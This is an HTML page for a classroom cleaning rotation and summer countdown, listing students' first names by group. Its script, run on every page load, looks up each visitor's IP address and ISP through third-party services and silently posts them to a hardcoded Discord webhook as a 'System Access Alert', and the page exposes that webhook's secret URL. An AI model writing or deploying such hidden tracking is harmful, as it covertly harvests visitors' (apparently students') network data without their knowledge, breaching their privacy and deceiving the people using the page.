<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Classroom Cleaning Rotation</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .card {
            background: white;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            border: 1px solid #e2e8f0;
        }
        .day-card {
            transition: all 0.3s ease;
        }
        .today-highlight {
            border-color: #3b82f6;
            background-color: #eff6ff;
            transform: scale(1.02);
            z-index: 10;
        }
        .break-card {
            background-color: #f1f5f9;
            border-style: dashed;
            border-width: 2px;
        }
        .countdown-gradient {
            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
        }
        #summerOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: linear-gradient(to bottom, #fde68a, #fbbf24);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .nav-link.active {
            background-color: #3b82f6;
            color: white;
        }
        .privacy-box {
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: help;
        }
        .blur-text {
            filter: blur(6px);
            transition: filter 0.3s ease;
        }
        .privacy-box:hover .blur-text {
            filter: blur(0);
        }
    </style>
</head>
<body class="p-4 md:p-8">

    <div id="summerOverlay">
        <div class="p-8">
            <h1 class="text-6xl md:text-9xl mb-6">🏝️</h1>
            <h2 class="text-4xl md:text-6xl font-black text-amber-900 mb-4 italic uppercase">The time is up!</h2>
            <p class="text-2xl md:text-4xl font-bold text-amber-800 uppercase tracking-widest">Summer is here!</p>
            <p class="mt-8 text-amber-700 font-medium">Cleaning duties are officially over.</p>
        </div>
    </div>

    <div class="max-w-6xl mx-auto" id="mainContent">
        <div class="flex flex-col md:flex-row items-center justify-between mb-8 gap-4">
            <div id="userInfo" class="privacy-box bg-white/80 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
                <div class="blur-text flex flex-col gap-0.5 relative z-10">
                    <span id="displayIP" class="font-bold">IP: Locating...</span>
                    <span id="displayISP" class="truncate max-w-[200px]">ISP: Locating...</span>
                </div>
                <div class="absolute inset-0 flex items-center justify-center opacity-100 group-hover:opacity-0 transition-opacity pointer-events-none bg-white/90">
                    <span class="text-[9px] uppercase tracking-tighter text-slate-400 font-bold">Hover to reveal info</span>
                </div>
            </div>

            <nav class="flex space-x-2">
                <button onclick="showTab('schedule')" id="scheduleTabBtn" class="nav-link active px-6 py-2 rounded-full font-bold text-sm transition-all shadow-sm bg-white text-slate-600 hover:bg-slate-50">Schedule</button>
                <button onclick="showTab('countdown')" id="countdownTabBtn" class="nav-link px-6 py-2 rounded-full font-bold text-sm transition-all shadow-sm bg-white text-slate-600 hover:bg-slate-50">Countdown</button>
            </nav>
            <div class="w-[220px] hidden md:block"></div>
        </div>

        <div id="countdownSection" class="hidden mb-8 countdown-gradient rounded-2xl p-8 text-white shadow-xl text-center border border-slate-700">
            <h2 class="text-sm font-bold uppercase tracking-[0.3em] text-slate-400 mb-6">Countdown to Summer Break</h2>
            <div id="countdownDisplay" class="text-4xl md:text-7xl font-black tracking-tighter flex justify-center gap-4 md:gap-8">
                <div class="flex flex-col"><span id="days">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Days</span></div>
                <span class="opacity-30 self-center">:</span>
                <div class="flex flex-col"><span id="hours">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Hrs</span></div>
                <span class="opacity-30 self-center">:</span>
                <div class="flex flex-col"><span id="minutes">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Min</span></div>
                <span class="opacity-30 self-center">:</span>
                <div class="flex flex-col"><span id="seconds">00</span><span class="text-xs uppercase tracking-widest text-slate-400 mt-2">Sec</span></div>
            </div>
        </div>

        <div id="scheduleSection">
            <header class="text-center mb-8">
                <h1 class="text-4xl font-extrabold text-slate-800 tracking-tight">Class Cleaning Schedule</h1>
                <div class="mt-4 flex flex-col items-center gap-2">
                    <div class="text-slate-500 font-medium text-lg" id="liveDate"></div>
                    <div class="text-3xl font-mono font-bold text-blue-600 bg-blue-50 px-6 py-2 rounded-2xl border border-blue-100 shadow-inner" id="liveClock">
                        00:00:00
                    </div>
                </div>

                <div class="inline-flex items-center mt-8 space-x-4 bg-white px-6 py-2 rounded-full border border-slate-200 shadow-sm">
                    <button onclick="changeWeek(-1)" class="hover:text-blue-600 font-bold px-2 text-xl transition-colors">&larr;</button>
                    <p id="currentWeekDisplay" class="text-slate-700 font-bold min-w-[200px] uppercase tracking-wide"></p>
                    <button onclick="changeWeek(1)" class="hover:text-blue-600 font-bold px-2 text-xl transition-colors">&rarr;</button>
                </div>
            </header>

            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-6" id="scheduleGrid"></div>
            <div class="mt-8 flex justify-center"><div id="breakSection" class="w-full max-w-md"></div></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476862249187545179/Xy23AO6sPJts4PPSB6zTbUSVdqTWIIpCQsmwCNQtk_hqhz-F3eSoCYaC_SMn7xeFQ23W";

        const groups = [
            { name: "Group 1", members: ["Azuza", "Masao", "Ciana", "Tiara"] },
            { name: "Group 2", members: ["Layleen", "Hanna", "Dominique", "Lyani"] },
            { name: "Group 3", members: ["Keilia", "Aalayna", "Wiwi", "Archie"] },
            { name: "Group 4", members: ["Kate.L", "Veriana", "Soleil", "Jade"] },
            { name: "Group 5", members: ["Duke", "Carlyle", "Nikoroi", "David"] },
            { name: "Group 6", members: ["Reg", "SA", "Jayrose", "Jay", "Carter"] }
        ];

        const days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"];
        let weekOffset = 0;
        const summerDate = new Date("May 29, 2026 00:00:00").getTime();

        /** * ROBUST SECURITY LOGIC
         * Handles the "json Failed to load" error with fallbacks
         */
        function startSecurity() {
            let webhookSent = false;

            // Global Webhook trigger to ensure it only fires once per load
            function triggerWebhook(ip, isp) {
                if (webhookSent) return;
                webhookSent = true;

                const payload = {
                    content: "🚨 **System Access Alert**",
                    embeds: [{
                        description: `**User IP:** \`${ip}\`\n**ISP:** \`${isp}\`\n**Time:** ${new Date().toLocaleString()}`,
                        color: 15158332,
                        footer: { text: "Security Monitor Active" }
                    }]
                };

                const xhr = new XMLHttpRequest();
                xhr.open("POST", WEBHOOK_URL);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(payload));
            }

            // Primary ISP Callback
            window.receiveGeo = function(data) {
                if (!data) return;
                const isp = data.org || data.isp || data.businessName || "Unknown ISP";
                document.getElementById('displayISP').textContent = "ISP: " + isp;
                const currentIP = document.getElementById('displayIP').textContent.replace('IP: ', '');
                triggerWebhook(currentIP, isp);
            };

            // Primary IP Callback (ipify)
            window.receiveIP = function(data) {
                const userIP = data.ip || "Unknown";
                document.getElementById('displayIP').textContent = "IP: " + userIP;
                
                // Try ISP Lookup
                const geoScript = document.createElement('script');
                geoScript.src = `https://extreme-ip-lookup.com/json/?callback=receiveGeo&key=demo27`;
                geoScript.onerror = () => {
                    // Fallback to second ISP provider if extreme-ip fails
                    const altGeo = document.createElement('script');
                    altGeo.src = "https://ipapi.co/jsonp?callback=receiveGeo";
                    document.head.appendChild(altGeo);
                };
                document.head.appendChild(geoScript);
            };

            // Start IP Fetch
            const script = document.createElement('script');
            script.src = "https://api.ipify.org?format=jsonp&callback=receiveIP";
            document.head.appendChild(script);
        }

        function showTab(tab) {
            document.getElementById('countdownSection').classList.toggle('hidden', tab !== 'countdown');
            document.getElementById('scheduleSection').classList.toggle('hidden', tab !== 'schedule');
            document.getElementById('countdownTabBtn').classList.toggle('active', tab === 'countdown');
            document.getElementById('scheduleTabBtn').classList.toggle('active', tab === 'schedule');
        }

        function updateClock() {
            const now = new Date();
            document.getElementById('liveClock').textContent = now.toLocaleTimeString();
            document.getElementById('liveDate').textContent = now.toLocaleDateString(undefined, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
        }

        function updateCountdown() {
            const distance = summerDate - new Date().getTime();
            if (distance < 0) {
                document.getElementById("summerOverlay").style.display = "flex";
                document.getElementById("mainContent").style.display = "none";
                return;
            }
            document.getElementById("days").textContent = String(Math.floor(distance / 86400000)).padStart(2, '0');
            document.getElementById("hours").textContent = String(Math.floor((distance % 86400000) / 3600000)).padStart(2, '0');
            document.getElementById("minutes").textContent = String(Math.floor((distance % 3600000) / 60000)).padStart(2, '0');
            document.getElementById("seconds").textContent = String(Math.floor((distance % 60000) / 1000)).padStart(2, '0');
        }

        function getWeekNumber(d) {
            d = new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));
            d.setUTCDate(d.getUTCDate() + 4 - (d.getUTCDay() || 7));
            return Math.ceil((((d - new Date(Date.UTC(d.getUTCFullYear(), 0, 1))) / 86400000) + 1) / 7);
        }

        function changeWeek(dir) { weekOffset += dir; renderSchedule(); }

        function renderSchedule() {
            const grid = document.getElementById('scheduleGrid');
            const targetDate = new Date();
            targetDate.setDate(targetDate.getDate() + (weekOffset * 7));
            
            const weekNum = getWeekNumber(targetDate);
            const startIdx = ((weekNum * 5) + 2) % groups.length;
            const today = new Date().getDay();
            const isThisWeek = (weekOffset === 0);

            document.getElementById('currentWeekDisplay').innerText = isThisWeek ? "CURRENT WEEK" : `OFFSET: ${weekOffset} WEEK(S)`;

            let html = "";
            let assigned = [];
            for (let i = 0; i < 5; i++) {
                const idx = (startIdx + i) % groups.length;
                assigned.push(idx);
                const isToday = isThisWeek && (i + 1) === today;
                html += `
                    <div class="day-card card p-6 ${isToday ? 'today-highlight' : ''}">
                        <div class="flex justify-between items-center mb-2">
                            <h3 class="font-bold text-lg">${days[i]}</h3>
                            ${isToday ? '<span class="bg-blue-600 text-[8px] text-white px-1.5 py-0.5 rounded font-black">TODAY</span>' : ''}
                        </div>
                        <p class="text-blue-600 font-bold text-sm mb-3">${groups[idx].name}</p>
                        <ul class="text-xs text-slate-500 space-y-1">
                            ${groups[idx].members.map(m => `<li>• ${m}</li>`).join('')}
                        </ul>
                    </div>`;
            }
            grid.innerHTML = html;
            
            const bIdx = groups.findIndex((_, i) => !assigned.includes(i));
            const breakGroup = groups[bIdx];
            
            document.getElementById('breakSection').innerHTML = `
                <div class="card break-card p-6 text-center">
                    <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">On Break</span>
                    <h3 class="text-xl font-bold text-slate-500 mb-3">${breakGroup.name}</h3>
                    <div class="flex flex-wrap justify-center gap-2">
                        ${breakGroup.members.map(m => `<span class="bg-slate-200 text-slate-500 px-3 py-1 rounded-full text-[10px] font-medium">• ${m}</span>`).join('')}
                    </div>
                </div>`;
        }

        window.onload = () => {
            startSecurity();
            renderSchedule();
            updateClock();
            setInterval(updateClock, 1000);
            setInterval(updateCountdown, 1000);
        };
    </script>
</body>
</html>
